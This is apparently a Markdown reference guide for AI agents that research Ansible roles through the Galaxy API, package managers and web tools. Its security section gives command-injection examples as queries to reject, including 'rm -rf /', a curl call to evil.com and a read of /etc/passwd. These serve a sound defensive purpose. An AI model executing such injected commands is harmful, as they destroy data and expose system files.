# Research Sources Reference

This guide documents the research sources and tools available for discovering Ansible role features, packages, and best practices.

## Overview

The research workflow uses multiple sources to gather information:
1. **Galaxy API** - Popular role implementations and patterns
2. **Package Repositories** - System packages (apt, yum, dnf, choco)
3. **Web Search** - Documentation and community resources (CC only)
4. **Context7 MCP** - Knowledge base queries (CC only)

## Galaxy API

### Endpoint

```
https://galaxy.ansible.com/api/v3/plugin/ansible/search/collection-versions/
```

### Parameters

- `keywords` - Search query (e.g., "nginx", "mysql")
- `order_by` - Sort order (`-download_count` for most popular)
- `limit` - Max results (default: 10)

### Example Request

```bash
curl "https://galaxy.ansible.com/api/v3/plugin/ansible/search/collection-versions/?keywords=nginx&order_by=-download_count&limit=10"
```

### Response Format

```json
{
  "data": [
    {
      "namespace": { "name": "geerlingguy" },
      "name": "nginx",
      "download_count": 1500000,
      "community_score": 3.2,
      "description": "Installs and configures Nginx..."
    }
  ],
  "meta": { "count": 10 }
}
```

### Extracting Information

**From Galaxy responses, extract:**
- Role namespace and name
- Download count (popularity metric)
- Community score (convert to stars: `score * 100`)
- Description (for feature keywords)

**Feature keywords to look for:**
- `ssl|tls|https` → SSL/TLS support
- `virtual host|vhost` → Virtual hosts
- `load balanc` → Load balancing
- `cache|caching` → Caching
- `auth|authentication` → Authentication
- `firewall` → Firewall configuration
- `systemd|service` → Service management
- `docker|container` → Container support
- `cluster|ha` → High availability
- `backup` → Backup support
- `monitor` → Monitoring
- `log` → Logging

### Rate Limiting

- Galaxy API has no published rate limits
- Use 10-second timeout per request
- Fail gracefully if API unavailable

## Package Repository Search

### APT (Debian/Ubuntu)

**Check availability:**
```bash
which apt-cache >/dev/null 2>&1
```

**Search command:**
```bash
apt-cache search --names-only "^nginx"
```

**Parse output:**
```
nginx - small, powerful, scalable web/proxy server
nginx-full - nginx web/proxy server (standard version)
```

### DNF (RHEL 8+/Fedora)

**Check availability:**
```bash
which dnf >/dev/null 2>&1
```

**Search command:**
```bash
dnf search nginx --quiet
```

**Parse output:**
```
nginx.x86_64 : A high performance web server
```

### YUM (RHEL 7/CentOS)

**Check availability:**
```bash
which yum >/dev/null 2>&1
```

**Search command:**
```bash
yum search nginx --quiet
```

**Parse output:**
Same format as DNF

### Chocolatey (Windows)

**Check availability:**
```bash
where choco >/dev/null 2>&1
```

**Search command:**
```bash
choco search nginx --limit-output
```

**Parse output:**
```
nginx|1.24.0|
```

### Security Considerations

**CRITICAL: Always sanitize search queries before execution!**

```javascript
// ✅ SAFE - Validation pattern
if (!/^[a-zA-Z0-9_-]+$/.test(query)) {
  throw new Error('Invalid query');
}
```

**Reject queries containing:**
- Semicolons (`;`)
- Pipes (`|`)
- Ampersands (`&`)
- Dollar signs (`$`)
- Backticks (`` ` ``)
- Parentheses (`(`, `)`)
- Redirects (`>`, `<`)
- Newlines (`\n`, `\r`)

**Safe queries:**
- ✅ `nginx`
- ✅ `nginx-full`
- ✅ `postgresql-12`

**Dangerous queries:**
- ❌ `nginx; rm -rf /`
- ❌ `nginx && curl evil.com`
- ❌ `nginx | cat /etc/passwd`

### Timeouts

All package searches must timeout:
- Per-manager timeout: 5 seconds
- Total research timeout: 30 seconds
- Return partial results on timeout

## Web Search (CC Only)

**Note:** Web search is only available in Claude Code environments with the `WebSearch` tool.

### Search Queries

**For documentation:**
- `[software] ansible galaxy popular roles`
- `[software] ansible best practices`
- `[software] ansible role tutorial`

**For features:**
- `[software] common features configuration`
- `[software] production setup guide`
- `[feature] [software] implementation`

### Search Result Filtering

Focus on:
- Ansible Galaxy role pages
- Official Ansible documentation
- Software official documentation
- Community blog posts about Ansible

Avoid:
- Outdated content (pre-2020)
- Non-Ansible tutorials
- Marketing pages

## Context7 MCP (CC Only)

**Note:** Context7 is only available in Claude Code environments with MCP tool access.

### Query Types

**For documentation:**
```
Find official documentation for [software] configuration
```

**For best practices:**
```
What are Ansible best practices for [software] role?
```

**For patterns:**
```
Show common patterns for [software] Ansible roles
```

### Integration

Use Context7 for:
- Official documentation lookups
- Configuration examples
- Security best practices
- Performance tuning guides

## Research Workflow

### Phase 1: Initial Research (Parallel)

**DocsResearcher:**
1. Search Galaxy API for top roles
2. Extract features from descriptions
3. Query Context7/WebSearch for best practices
4. Return structured findings

**ImplResearcher:**
1. Detect available package managers
2. Sanitize search query
3. Search each package manager
4. Return package options with metadata

### Phase 2: Requirements Gathering

Present research findings to user:
- Show discovered features (essential/recommended/optional)
- Show package options with recommendations
- Incorporate into wizard questions

### Phase 3: Deep Dive (Optional)

**DeepDiveResearcher:**
1. Take user-selected features
2. Research each feature in depth
3. Provide multiple implementation approaches
4. Return feature-specific guidance

## Confidence Scoring

### High Confidence
- Found 5+ Galaxy roles with 1000+ downloads
- Clear feature patterns across roles
- Package found in 2+ repositories
- Official documentation available

### Medium Confidence
- Found 2-4 Galaxy roles
- Some feature patterns identified
- Package found in 1 repository
- Limited documentation

### Low Confidence
- Found 0-1 Galaxy roles
- Few features extracted
- No packages found
- Very limited information

## Error Handling

### Galaxy API Unavailable

**Fallback strategy:**
1. Continue with package search
2. Use cached knowledge of common patterns
3. Return medium/low confidence
4. Log source limitation

### Package Manager Not Found

**Fallback strategy:**
1. Return empty packages array
2. Include generic implementation features
3. Focus on best practices
4. Set confidence to low

### Search Timeout

**Fallback strategy:**
1. Return partial results collected
2. Mark incomplete research
3. Set confidence to medium/low
4. Note timeout in response

### Invalid Query Detected

**Immediate action:**
1. STOP execution immediately
2. Log security warning
3. Return empty results
4. Set confidence to low
5. Never execute unsafe commands

## Best Practices for Agents

1. **Always sanitize inputs** - Never trust user-provided search queries
2. **Timeout protection** - All external calls must have timeouts
3. **Fail gracefully** - Research failures should not block generation
4. **Parallel execution** - Run DocsResearcher and ImplResearcher in parallel
5. **Structured output** - Always return consistent JSON schema
6. **Source attribution** - Track which sources provided findings
7. **Confidence scoring** - Assess quality of research results

## Limitations

### CLI Environment
- No WebSearch tool available
- No Context7 MCP available
- Galaxy API + package search only
- Still valuable for package discovery

### CC Environment
- Full tool access
- WebSearch for documentation
- Context7 for knowledge queries
- Galaxy API + package search

### Timing
- Initial research: ~5-10 seconds (parallel)
- Deep dive: ~15-30 seconds (sequential per feature)
- Total overhead: ~20-40 seconds for complete workflow

## Examples

### Example 1: Nginx Research

**Galaxy findings:**
- geerlingguy.nginx (1.5M downloads)
- jdauphant.nginx (500K downloads)
- Features: SSL/TLS, virtual hosts, reverse proxy

**Package findings:**
- nginx (apt) - High-performance web server
- nginx-full (apt) - Nginx with additional modules

**Confidence:** High (multiple sources, clear patterns)

### Example 2: Custom Software

**Galaxy findings:**
- No roles found

**Package findings:**
- custom-app (apt) - Custom application

**Confidence:** Low (limited information)
- Fall back to generic best practices
- Include standard patterns

## Troubleshooting

### Issue: No research results

**Check:**
- Is Galaxy API accessible?
- Are package managers available?
- Is query sanitization too strict?

**Solution:**
- Verify network connectivity
- Check package manager paths
- Adjust search query

### Issue: Timeout errors

**Check:**
- Is system under heavy load?
- Are external APIs slow?

**Solution:**
- Increase timeout values
- Return partial results
- Reduce parallel operations

### Issue: Security warnings

**Check:**
- Is query sanitization working?
- Are there command injection attempts?

**Solution:**
- Review sanitization logic
- Block malicious queries
- Log security events

## References

- [Ansible Galaxy API Docs](https://galaxy.ansible.com/docs/)
- [APT Documentation](https://wiki.debian.org/Apt)
- [DNF Documentation](https://dnf.readthedocs.io/)
- [Chocolatey Docs](https://docs.chocolatey.org/)
